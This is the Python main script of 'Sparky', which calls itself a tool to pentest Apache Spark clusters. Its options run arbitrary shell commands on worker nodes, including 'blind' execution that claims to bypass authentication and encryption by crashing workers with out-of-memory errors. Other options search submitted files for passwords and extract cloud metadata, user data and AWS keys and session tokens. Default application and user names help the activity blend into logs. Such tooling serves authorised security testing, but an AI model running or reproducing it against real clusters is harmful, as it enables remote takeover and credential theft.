import argparse
from utils.sparkClient import SparkClient
from utils.general import (
    confirmSpark,
    parseListNodes,
    removeSpaces,
    checkRestPort,
    checkHTTPPort,
    whine,
    isValidFile,
    request_stop,
)
from utils.cmd import (
    parseCommandOutput,
    blindCommandExec,
    restCommandExec,
    scalaCommandExec,
)
from utils.auth import isSecretSaslValid
import multiprocessing
import sys, os, signal, base64
from utils.logo import logo


def validateYarnOptions(results):
    if results.yarn and results.hdfs == "None":
        whine(
            "Running in Yarn mode requires an HDFS cluster. Please add the option --hdfs ip:port",
            "err",
        )
        sys.exit(-1)


def displayWarningPy():
    whine(
        "Spark workers running a different version than Python %s.%s will throw errors. See -P option"
        % (sys.version_info[0], sys.version_info[1]),
        "warn",
    )


def main(results):
    hostPort = results.spark_master.split(":")
    localIP = results.driver_ip
    appName = results.appName
    username = results.username
    target = hostPort[0]
    binPath = results.binPath
    restJarURL = results.restJarURL
    useScala = results.useScala
    pyBinary = results.pyBinary
    useRest = False
    useBlind = False
    port = 8032 if results.yarn else 7077
    if len(hostPort) > 1:
        port = int(hostPort[1])

    if results.yarn:
        validateYarnOptions(results)

    sClient = SparkClient(target, port, localIP, appName, username)
    sClient.restPort = results.restPort
    sClient.httpPort = results.httpPort
    if results.yarn:
        sClient.yarn = True
        sClient.hdfs = results.hdfs

    if not results.restJarURL is None:
        useRest = True
        if not results.cmd and not results.script:
            whine(
                "Please provide a command (-c) or script (-s) to execute via REST",
                "err",
            )
            sys.exit(-1)

    confirmSpark(sClient)
    if sys.version_info[0] > 2 and results.pyBinary == "python":
        displayWarningPy()

    sClient.prepareConf(results.secret, results.pyBinary)
    if len(results.secret) > 0:
        validSecret = isSecretSaslValid(sClient, results.secret)
        if validSecret:
            whine("Sucessfull authentication on Spark master", "good")
        elif validSecret is None:
            whine("Could not reliably validate the secret provided", "warn")
        else:
            whine("Failed authentication using the secret provided", "err")
            sys.exit(-1)

    if results.listNodes:
        checkRestPort(sClient)
        gotInfo = checkHTTPPort(sClient)
        if not gotInfo:
            sClient.initContext()
            parseListNodes(sClient)
        sys.exit(0)

    if results.blind:
        whine("Performing blind command execution on workers", "info")
        useBlind = True
    elif sClient.sc is None and not useRest and not useScala:
        sClient.initContext()
        print("")

    if results.listFiles:
        interpreterArgs = [
            "/bin/bash",
            "-c",
            'find "$(cd ../..; pwd)" -type f -name "{0}" -printf "%M\t%u\t%g\t%6k KB\t%Tc\t%p\n" |grep -v stderr |grep -v stdout'.format(
                results.extension
            ),
        ]
        parseCommandOutput(sClient, interpreterArgs, results.numWokers)

    if results.passwdInFile:
        scriptContent = open("./utils/searchPass.py", "r").read()
        interpreterArgs = [pyBinary, "-c", scriptContent, results.extension]
        parseCommandOutput(sClient, interpreterArgs, results.numWokers)

    if results.cmd:
        if useBlind:
            blindCommandExec(
                sClient,
                binPath,
                base64.b64encode(results.cmd.encode("utf-8")),
                results.maxMem,
            )
        elif useRest:
            restCommandExec(
                sClient,
                binPath,
                base64.b64encode(results.cmd),
                restJarURL,
                results.maxMem,
            )
        elif useScala:
            hydratedCMD = "rm *.jar 2> /dev/null; %s" % results.cmd
            scalaCommandExec(
                sClient,
                base64.b64encode(hydratedCMD.encode("utf-8")),
                results.numWokers,
            )
        else:
            interpreterArgs = [binPath, "-c", results.cmd]
            parseCommandOutput(sClient, interpreterArgs, results.numWokers)

    if results.script:
        scriptContent = results.script.read().encode("utf-8")
        if useBlind:
            blindCommandExec(
                sClient, binPath, base64.b64encode(scriptContent), results.maxMem
            )
        elif useRest:
            restCommandExec(
                sClient, binPath, base64.b64encode(scriptContent), results.maxMem
            )
        elif useScala:
            hydratedCMD = "rm *.jar 2> /dev/null;%s" % scriptContent
            scalaCommandExec(
                sClient,
                base64.b64encode(hydratedCMD.encode("utf-8")),
                results.numWokers,
            )
        else:
            interpreterArgs = [binPath, "-c", scriptContent]
            parseCommandOutput(sClient, interpreterArgs, results.numWokers)

    if results.metadata:
        scriptContent = open("./utils/cloud.py", "r").read()
        interpreterArgs = [pyBinary, "-c", scriptContent, "metadata"]
        parseCommandOutput(sClient, interpreterArgs, results.numWokers)

    if results.userdata:
        scriptContent = open("./utils/cloud.py", "r").read()
        interpreterArgs = [pyBinary, "-c", scriptContent, "userdata"]
        parseCommandOutput(sClient, interpreterArgs, results.numWokers)

    if results.privatekey:
        scriptContent = open("./utils/cloud.py", "r").read()
        interpreterArgs = [pyBinary, "-c", scriptContent, "privatekey"]
        parseCommandOutput(sClient, interpreterArgs, results.numWokers)


class MyParser(argparse.ArgumentParser):
    def error(self, message):
        logo()
        self.print_help()
        sys.exit(2)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, request_stop)
    signal.signal(signal.SIGTERM, request_stop)

    parser = MyParser(description="Sparky: a tool to pentest Spark clusters")
    parser.add_argument(
        "spark_master",
        help="The master node of a Spark cluster host:port. If no port is provided, default to 7077",
    )
    parser.add_argument(
        "driver_ip", help="Local IP to bind to for communicating with spark workers."
    )

    group_general = parser.add_argument_group("General")
    group_cmd = parser.add_argument_group("Command execution")
    group_cloud = parser.add_argument_group("Cloud environment (AWS, DigitalOcean)")

    ## General options ##
    ###################
    group_general.add_argument(
        "-l",
        "--list",
        help="Check REST API, HTTP interface, list executor nodes, version, applications if possible",
        action="store_true",
        default=False,
        dest="listNodes",
    )
    group_general.add_argument(
        "-A",
        "--appname",
        help="Name of the app as it will appear in the spark logs",
        default="ML exp",
        dest="appName",
    )
    group_general.add_argument(
        "-U",
        "--username",
        help="Name of the user as it will appear in the spark logs",
        default="lambda",
        dest="username",
    )
    group_general.add_argument(
        "-S",
        "--secret",
        help="Secret to authenticate to Spark master when SASL authentication is required",
        default="",
        dest="secret",
    )
    group_general.add_argument(
        "-P",
        "--py",
        help="Python binary to execute worker commands. Can be full path. Version must match the binary used to execute this tool.",
        default="python",
        dest="pyBinary",
    )

    group_general.add_argument(
        "-f",
        "--list-files",
        help="Gather list of files (jars, py, etc.) submitted to a worker - usually contains sensitive information",
        action="store_true",
        default=False,
        dest="listFiles",
    )
    group_general.add_argument(
        "-k",
        "--search",
        help="Search for patterns in files submitted to a worker. Default Patterns hardcoded in utils/searchPass.py",
        action="store_true",
        default=False,
        dest="passwdInFile",
    )

    group_general.add_argument(
        "-e",
        "--extension",
        help="Performs list and search operations on particular extensions of files submitted to a worker: *.txt, *.jar, *.py. Default: *",
        default="*",
        dest="extension",
    )
    group_general.add_argument(
        "-y",
        "--yarn",
        help="Submits the spark application to a Yarn cluster",
        action="store_true",
        default=False,
        dest="yarn",
    )
    group_general.add_argument(
        "-d",
        "--hdfs",
        help="Full address of the HDFS cluster (host:ip)",
        default="None",
        dest="hdfs",
    )
    group_general.add_argument(
        "-r",
        "--rest-port",
        help="Use this port to contact the REST API (default: 6066)",
        default="6066",
        dest="restPort",
    )
    group_general.add_argument(
        "-t",
        "--http-port",
        help="Use this port to contact the HTTP master web page (default: 8088)",
        default="8080",
        dest="httpPort",
    )
    group_general.add_argument(
        "-q",
        "--quiet",
        help="Hide the cool ascii art",
        action="store_true",
        default=False,
        dest="quietMode",
    )

    ## Command options ##
    ###################
    group_cmd.add_argument(
        "-c",
        "--cmd",
        help="Execute a command on one or multiple worker nodes",
        default=False,
        dest="cmd",
    )
    group_cmd.add_argument(
        "-s",
        "--script",
        help="Execute a bash script on one or multiple worker nodes",
        type=lambda x: isValidFile(parser, x),
        default=False,
        dest="script",
    )
    group_cmd.add_argument(
        "-b",
        "--blind",
        help="Bypass authentication/encryption and blindly execute a command on a random worker node",
        action="store_true",
        default=False,
        dest="blind",
    )
    group_cmd.add_argument(
        "-m",
        "--max-memory",
        help='Maximum Heap memory allowed for the worker to make it crash and execute code. Usually varies between 1 and 10 (MB) Use with "-b" option. Default: 2',
        default="2",
        dest="maxMem",
    )
    group_cmd.add_argument(
        "-n",
        "--num-workers",
        type=int,
        help="Number of workers to execute a command/search on. Default: 1",
        default=1,
        dest="numWokers",
    )
    group_cmd.add_argument(
        "-w",
        "--rest-exec",
        nargs="?",
        help="if empty, execute a system command (-c or -s) on a random worker using OnOutOfMemoryError trick. You can provide a legitimate jar file to execute instead. Format: FULL_JAR_URL::MAIN_Class",
        const="spark://%s:%s",
        dest="restJarURL",
    )
    group_cmd.add_argument(
        "-x",
        "--runtime",
        help="Shell binary to execute commands and scripts on workers. Default:bash. Examples : sh, bash, zsh, ksh",
        default="bash",
        dest="binPath",
    )
    group_cmd.add_argument(
        "-a",
        "--scala",
        help="Submit a pure Scala JAR file instead of a Python wrapped Jar file.",
        action="store_true",
        dest="useScala",
    )

    ## Cloud options ##
    ###################
    group_cloud.add_argument(
        "-u",
        "--user-data",
        help="Gather userdata or custom data information",
        action="store_true",
        default=False,
        dest="userdata",
    )
    group_cloud.add_argument(
        "-g",
        "--meta-data",
        action="store_true",
        help="Gather metadata information from the cloud provider",
        default=False,
        dest="metadata",
    )
    group_cloud.add_argument(
        "-p",
        "--private-key",
        action="store_true",
        help="Extracts AWS private key and session token if a role is attached to the instance (AWS only)",
        default=False,
        dest="privatekey",
    )
    results = parser.parse_args()
    if not results.quietMode:
        logo()

    main(results)
